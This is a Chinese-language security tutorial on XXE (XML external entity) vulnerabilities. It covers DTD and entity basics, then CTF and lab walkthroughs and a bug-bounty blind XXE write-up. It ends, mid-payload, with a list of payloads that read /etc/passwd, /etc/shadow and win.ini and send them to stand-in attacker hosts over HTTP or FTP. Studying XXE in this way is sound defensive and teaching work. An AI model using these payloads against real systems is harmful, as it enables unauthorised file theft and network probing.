<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &#x2F;&#x2F;XML 声明</span><br><span class="line">&lt;!DOCTYPE entity [                     &#x2F;&#x2F;文档类型定义</span><br><span class="line">    &lt;!ENTITY name &quot;haogang&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt; &#x2F;&#x2F;文档元素</span><br><span class="line">    &lt;nickname&gt;&amp;name;&lt;&#x2F;nickname&gt; &#x2F;&#x2F;文档元素</span><br><span class="line">    &lt;age&gt;18&lt;&#x2F;age&gt;</span><br><span class="line">&lt;&#x2F;author&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>从两个角度可以把XML分为两类共4个类型：（内部实体、外部实体）、（通用实体、参数实体）。其中两大类含有重复的地方。</p>
<h1 id="0x02-DTD"><a href="#0x02-DTD" class="headerlink" title="0x02 DTD"></a>0x02 DTD</h1><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。</p>
<h2 id="带有DTD的XML文档实例"><a href="#带有DTD的XML文档实例" class="headerlink" title="带有DTD的XML文档实例"></a>带有DTD的XML文档实例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Y0u&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;@re&lt;&#x2F;from&gt;</span><br><span class="line">&lt;head&gt;v3ry&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;g00d!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295974594244.png!small" alt="2.png"></p>
<p>- PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1529597498511.png!small" alt="5.png"></p>
<p>不过，被解析的字符数据不应当包含任何&amp;，&lt;，或者&gt;字符，需要用<code>&amp;amp;</code> <code>&amp;lt;</code> <code>&amp;gt;</code>实体来分别替换</p>
<p>- CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p>
<h2 id="DTD元素"><a href="#DTD元素" class="headerlink" title="DTD元素"></a>DTD元素</h2><p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295975099603.png!small" alt="6.png"></p>
<p>DTD属性</p>
<p>属性声明使用以下语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></pre></td></tr></table></figure>
<p>DTD实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST payment Hu3sky CDATA &quot;H&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>XML实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;payment Hu3sky&#x3D;&quot;H&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>以下是属性类型的选项</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295975192117.png!small" alt="7.png"></p>
<p>默认值参数可以使用下列值:</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295975369757.png!small" alt="8.png"></p>
<h2 id="DTD-实体-重要"><a href="#DTD-实体-重要" class="headerlink" title="DTD-实体(重要)"></a><strong>DTD-实体(重要)</strong></h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
<p>实体引用是对实体的引用。</p>
<p>实体可以在内部或外部进行声明</p>
<p><strong>通用实体：</strong><u>&amp;实体名;</u> 引用的实体，他在DTD中定义，在XML文档中引用</p>
<p><strong>参数实体</strong>：</p>
<p>a.使用% 实体名（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用%实体名; 引用</p>
<p>b.只有在DTD文件中，参数实体的声明才能引用其他实体</p>
<p>c.和通用实体一样，参数实体也可以外部引用</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295975464414.png!small" alt="9.png"></p>
<p><em>内部实体</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><em>外部实体</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><em>参数实体</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %实体名称 &quot;值&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
<h2 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h2><p>这里DTD（文档类型定义）的作用是定义XML文件中有哪些模块，这些模块能包含什么样的内容。常见的模块有元素，属性，实体等等。</p>
<p>其中一种模块是实体。实体就像编程语言中的常量，我们可以将一串普通文本定义为一个实体，这样就可以在XML 通过这个实体引用这段文本。实体有两种，直接在DTD 中声明的实体称为内部实体，通过<code>SYSTEM</code> 从外部引入内容的是外部实体。</p>
<p>这样解释比较抽象，我们先来看一个内部实体的示例，看看实体到底是什么。内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE entity [</span><br><span class="line">    &lt;!ENTITY name &quot;haogang&quot;&gt; &#x2F;&#x2F;定义实体 name</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;</span><br><span class="line">    &lt;nickname&gt;&amp;name;&lt;&#x2F;nickname&gt; &#x2F;&#x2F;使用实体，&amp;实体名;</span><br><span class="line">    &lt;age&gt;18&lt;&#x2F;age&gt;</span><br><span class="line">&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>
<p>定义好实体后，在XML 中使用实体时，有固定的格式：以 <code>&amp;</code> 开头，中间是实体名，再以 <code>;</code> 结尾。经过解析后，实体将会被替换成定义的内容，这里XML 会变成这样:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;</span><br><span class="line">    &lt;nickname&gt;haogang&lt;&#x2F;nickname&gt; &#x2F;&#x2F;将内容替换为实体内容</span><br><span class="line">    &lt;age&gt;18&lt;&#x2F;age&gt;</span><br><span class="line">&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>
<p>这就是实体，通过将一串文本定义为一个实体，就可以在XML 通过这个实体来引用这段文本。</p>
<h2 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h2><p>在来看一下外部实体，这是一个外部实体的示例，外部实体的标志是使用<code>SYSTEM</code> 将外部文件的内容定义到实体上，然后可以在XML 中通过这个实体，引用外部文件的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE entity[</span><br><span class="line">    &lt;!ENTITY name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;password&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;</span><br><span class="line">    &lt;nickname&gt;&amp;name;&lt;&#x2F;nickname&gt;</span><br><span class="line">    &lt;age&gt;18&lt;&#x2F;age&gt;</span><br><span class="line">&lt;&#x2F;author&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>这里实体将会被替换成定义的内容，也就是<code>/etc/password</code>，正常使用中 <code>nickname</code> 的内容可能被返回给用户，也就会将服务器<code>password</code> 的内容暴露给了攻击者，导致服务器被攻击。</p>
<p>XXE 漏洞，正是利用了XML 外部实体可以解析外部文件的特性，才使得攻击成为可能。</p>
<h2 id="参数实体-外部实体"><a href="#参数实体-外部实体" class="headerlink" title="参数实体+外部实体"></a><em>参数实体+外部实体</em></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">  &lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">  %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p><code>%name</code>(参数实体)是在DTD中被引用的，而<code>&amp;name;</code>是在xml文档中被引用的。</p>
<p>XXE主要是利用了DTD引用外部实体导致的漏洞。</p>
<h1 id="0x03攻击实例"><a href="#0x03攻击实例" class="headerlink" title="0x03攻击实例"></a>0x03攻击实例</h1><h2 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a><strong>读取任意文件</strong></h2><h3 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h3><p>外部实体引用,有回显</p>
<p>这里我用bWAPP平台上的一道XXE的题目来说明</p>
<p>题目是这样的，我们点击这个按钮然后抓包看看<img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295977151714.png!small" alt="11.png"></p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295979524821.png!small" alt="12.png">可以看到xxe-1.php页面以POST方式向xxe-2.php页面传输了XML数据，既然是XML数据，我们就可以自己增加一个恶意外部实体然后再原本的XML数据中进行实体调用，来进行XXE攻击，如下：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295976132603.png!small" alt="13.png">可以看到，成功的读取了robots.txt中的内容，这里的hu3sky是我们定义的一个外部实体。</p>
<p>为了更好理解原理，我们来看一看xxe-2.php的源码。</p>
<p>主要代码在这。</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1529597634926.png!small" alt="17.png">可以看到这里直接用了<code>simplexml_load_string()</code> ，simplexml_load_string() 函数的作用是把XML 字符串载入对象中。函数获取xml内容，并没有做任何过滤，$login获取login标签里的内容，最后拼接到$message显示在屏幕上<img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295976596718.png!small" alt="18.png"></p>
<h3 id="例子二"><a href="#例子二" class="headerlink" title="例子二"></a><strong>例子二</strong></h3><p>jarvisoj上的一道题目API调用</p>
<p>这道题的题目说明是 请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
<p>进入题目 <a target="_blank" rel="noopener" href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a> 发现一个输入框，我们对其进行抓包<img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295980162679.png!small" alt="3.png">发现了json数据，修改发现可以被解析</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1529597684814.png!small" alt="4.png">。一开始没有思路，后来看了wp，发现是要把json处改为xml。所以就知道了，这题是xxe。修改json处，构造一个xml表单进行xml注入，得到flag。<img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1529597696340.png!small" alt="5.png"></p>
<h2 id="检测内网端口"><a href="#检测内网端口" class="headerlink" title="检测内网端口"></a><strong>检测内网端口</strong></h2><p>有回显时，直接发送payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY XXE SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;XXE;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
<p>当我们检测80端口时，80端口开放，这时会返回页面报错信息(记得url编码。因为页面会解码一次)，如下：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295977396671.png!small" alt="15.png">当我们检测3389端口，3389端口未开放，端口未开放时返回情况如下：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295977524378.png!small" alt="16.png"></p>
<h2 id="Bind-XXE"><a href="#Bind-XXE" class="headerlink" title="Bind XXE"></a>Bind XXE</h2><p>如果服务器没有回显，只能使用Blind XXE漏洞来构建一条外带数据(OOB)通道来读取数据。</p>
<p>所以，在没有回显的情况下如何来利用XXE</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295977644027.png!small" alt="14.png"></p>
<p>思路：</p>
<ol>
<li><p>客户端发送payload 1给web服务器</p>
</li>
<li><p>web服务器向vps获取恶意DTD，并执行文件读取payload2</p>
</li>
<li><p>web服务器带着回显结果访问VPS上特定的FTP或者HTTP</p>
</li>
<li><p>通过VPS获得回显（nc监听端口）</p>
</li>
</ol>
<p>本地客户端(payload 1 )</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;vps&#x2F;test.xml&quot;&gt; %remote;]&gt;</span><br></pre></td></tr></table></figure>
<p>由于web端会解码，所以需要我们先html实体编码一次</p>
<p>payload 2 也就是test.xml的内容(VPS)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % trick SYSTEM &#39;ftp:&#x2F;&#x2F;VPS:21&#x2F;%payload;&#39;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
<p>这个是先将SYSTEM的file协议读取到的内容赋值给参数实体%payload，第二步是一个实体嵌套，trick是远程访问ftp协议所携带的内容</p>
<h2 id="拓：Bind-XXE实例"><a href="#拓：Bind-XXE实例" class="headerlink" title="拓：Bind XXE实例"></a>拓：Bind XXE实例</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先，与大多数挖洞者的探测模式一样，我对目标网站进行了全方位的服务资产踩点识别，在此过程中，我发现了其中一个子域名网站比较有意思，于是，我就对它进行了目录遍历，然后，就发现了其名为/notifications的服务端。在BurpSuite中，对这个/notifications服务端的请求和响应如下图所示：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15224809138499.png!small" alt="利用BLIND OOB XXE漏洞获取文件系统访问权限的测试"></p>
<p>在其响应内容中，我注意到，除了有XML内容外，还包含了一个XML SOAP语法体。由于没有GET参数可供测试，因此我决定向该/notifications服务端发送一个简单的，不指定任何内容类型（content-type）的POST请求进行探究，之后，在POST请求发出后，XML SOAP语法体不再出现，而且整个请求响应的代码为200：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15224809431488.png!small" alt="利用BLIND OOB XXE漏洞获取文件系统访问权限的测试"></p>
<p>看来，貌似该Web应用端对POST请求能做出很好的响应，且不会抛出405的请求方法错误，所以我又构造定义了包含content-type: application/xml样式的XML语法内容，用它来作POST请求，看看响应如何：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1522480960730.png!small" alt="利用BLIND OOB XXE漏洞获取文件系统访问权限的测试"></p>
<p>虽然这次的POST响应还是XML内容，但却与上一次不同，这种响应表面上看似像服务端对GET请求的响应，而且，这次的响应内容中包含的标签值不是上次的“TestRequestCalled”，而是“OK”。接着，我又发送了一个定义的JSON请求（content-type: application/json），来测试服务端的具体响应：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15224809851093.png!small" alt="利用BLIND OOB XXE漏洞获取文件系统访问权限的测试"></p>
<p>这一次，响应内容又是空的，和未指定任何内容类型的简单POST请求响应一样，由此，我推断该服务端能正常处理XML数据，这样一来，我想尝试利用BLIND XXE攻击方式来触发其漏洞。我通过在自己VPS上架设了一个dtd文件，然后利用外部实体引用途径来测试其XML解析机制，幸运的是，最终部署在我VPS上的这个外部dtd文件实体被成功解析引用，以下是其请求内容和最后的解析结果：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15224810055081.png!small" alt="利用BLIND OOB XXE漏洞获取文件系统访问权限的测试"></p>
<h3 id="xxe-ftp-server-rb脚本应用"><a href="#xxe-ftp-server-rb脚本应用" class="headerlink" title="xxe-ftp-server.rb脚本应用"></a>xxe-ftp-server.rb脚本应用</h3><p>由于该系统使用了java框架，而俄罗斯OnSec实验室曾针对Java程序的XXE-OOB攻击作出了<a target="_blank" rel="noopener" href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html">相关研究</a>，并给出相应的payload，以及一个通过ftp服务读取系统目录的漏洞利用脚本<a target="_blank" rel="noopener" href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">xxe-ftp-server.rb</a>，运行该脚本后，8088端口作为http服务端负责获取OOB攻击payload，而8077端口用于ftp连接服务，最终能成功读取到目标系统目录：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1522481053799.png!small" alt="利用BLIND OOB XXE漏洞获取文件系统访问权限的测试"></p>
<p>尽管最后该漏洞被确认为一个重复报，但我还是想把它分享出来，我自己也从中学到一些判断服务端应用的经验。</p>
<h3 id="一些有用的XXE-Payload"><a href="#一些有用的XXE-Payload" class="headerlink" title="一些有用的XXE Payload"></a>一些有用的XXE Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">Vanilla, used to verify outbound xxe or blind xxe</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY sp SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;sp;&lt;&#x2F;r&gt;</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">OoB extraction</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;ev.xml&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param1;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;exfil;&lt;&#x2F;r&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;?%data;&#39;&gt;&quot;&gt;</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">OoB variation of above (seems to work better against .NET)</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;ev.xml&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param1;</span><br><span class="line">%exfil;</span><br><span class="line">]&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;?%data;&#39;&gt;&quot;&gt;</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">OoB extraction</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ENTITY % data3 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow&quot;&gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http:&#x2F;&#x2F;EvilHost:port&#x2F;sp.dtd&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param3;</span><br><span class="line">%exfil;</span><br><span class="line">]&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % param3 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;ftp:&#x2F;&#x2F;Evilhost:port&#x2F;%data3;&#39;&gt;&quot;&gt;</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">OoB extra ERROR -- Java</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ENTITY % data3 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;ss5.dtd&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param3;</span><br><span class="line">%exfil;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&lt;&#x2F;r&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % param1 &#39;&lt;!ENTITY &amp;#x25; external SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;nothere&#x2F;%payload;&quot;&gt;&#39;&gt; %param1; %external;</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">OoB extra nice</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line"> &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line"> &lt;!ENTITY % stuff SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;customapp&#x2F;WEB-INF&#x2F;applicationContext.xml &quot;&gt;</span><br><span class="line">&lt;!ENTITY % end 